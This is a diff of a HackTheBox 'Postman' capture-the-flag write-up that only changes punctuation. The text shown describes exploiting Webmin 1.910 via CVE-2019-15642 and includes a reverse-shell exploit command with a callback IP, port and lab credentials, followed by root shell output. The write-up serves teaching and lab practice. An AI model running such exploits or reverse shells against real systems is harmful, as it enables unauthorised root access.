@@ -31,7 +31,7 @@ PORT      STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Three ports. Webmin `1.910` is an old version. The first thing I looked up was CVE-2019-15642 - that's an authenticated RCE that returns a shell as root. But it needs credentials, so it's a privesc primitive waiting to be used, not an entry point.
+Three ports. Webmin `1.910` is an old version. The first thing I looked up was CVE-2019-15642, an authenticated RCE that returns a shell as root. But it needs credentials, so it's a privesc primitive waiting to be used, not an entry point.
 
 *Reference: [github.com/jas502n/CVE-2019-15642](https://github.com/jas502n/CVE-2019-15642)*
 
@@ -181,7 +181,7 @@ SSH rejected it. The key is valid but Matt's account has SSH access disabled or 
 
 ![Webmin dashboard logged in as Matt showing Software Package Updates panel with 181 packages](/images/writeups/htb-postman/web-webmin-matt-dashboard.png)
 
-Logged in as Matt on Webmin 1.910. CVE-2019-15642 is an authenticated RCE in this version. The vulnerability is in a Perl eval in the package update functionality that doesn't sanitize its input, allowing arbitrary code execution under the account running Webmin - which is root. The original PoC was Python 2, so I ported it to Python 3 and adjusted it to trigger a reverse shell directly:
+Logged in as Matt on Webmin 1.910. CVE-2019-15642 is an authenticated RCE in this version. The vulnerability is in a Perl eval in the package update functionality that doesn't sanitize its input, allowing arbitrary code execution under the account running Webmin, which is root. The original PoC was Python 2, so I ported it to Python 3 and adjusted it to trigger a reverse shell directly:
 
 ```bash
 …/labs/postman ✗ python3 webmin_exploit_py3.py --rhost postman.htb --lhost 10.10.16.129 --lport 9999 -u Matt -p computer2008
@@ -205,6 +205,6 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Root. No intermediate step from Matt to root - Webmin runs as root, the RCE runs as root, that's it. Root flag.
+Root. No intermediate step from Matt to root. Webmin runs as root, the RCE runs as root, that's it. Root flag.
 
 The credential reuse between the SSH key passphrase and the Webmin login is the connection that makes this box work. It's easy to give up on Webmin after the initial nmap scan when you don't have creds yet. The Redis foothold and the backup key are the nudge to come back and try it. Password reuse on admin panels is extremely common in real environments, which is part of why this pattern shows up so often on HTB.
